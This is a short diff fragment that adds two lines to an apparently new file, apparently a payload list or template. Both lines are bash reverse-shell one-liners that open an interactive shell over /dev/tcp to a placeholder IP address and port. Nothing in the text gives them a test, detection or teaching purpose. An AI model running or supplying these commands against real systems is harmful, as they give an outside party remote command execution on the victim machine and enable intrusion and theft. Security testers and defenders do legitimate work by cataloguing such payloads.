@@ -1,0 +1,2 @@
+bash -i >& /dev/tcp/{ip}/{port} 0>&1
+0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196
